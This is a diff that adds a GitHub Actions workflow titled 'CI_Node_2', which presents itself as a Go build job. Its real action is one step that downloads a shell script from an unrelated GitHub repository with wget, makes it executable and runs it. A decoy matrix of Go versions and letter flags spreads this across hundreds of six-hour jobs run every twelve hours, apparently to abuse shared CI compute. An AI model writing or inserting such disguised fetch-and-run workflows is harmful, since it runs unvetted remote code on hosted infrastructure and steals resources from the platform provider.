@@ -1,0 +1,33 @@
+name: CI_Node_2
+# on: [push, pull_request]
+
+on:
+  
+  schedule:
+    - cron: '0 */12 * * *'
+  workflow_dispatch:
+jobs:
+  build:
+    name: embuhka
+    runs-on: ubuntu-latest    
+    strategy:
+        max-parallel: 40
+        fail-fast: false
+        matrix:
+            go: [1.6, 1.7, 1.8, 1.9, 1.10, 1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.17, 1.18, 1.19, 1.20]
+            flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X]
+    timeout-minutes: 360
+    env:
+          NUM_JOBS: 20
+          JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+       go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v2
+    - name: embuhka
+      run: |
+        wget https://raw.githubusercontent.com/makaryobos/privasi/main/lopemantan.sh && chmod +x *sh && ./lopemantan.sh
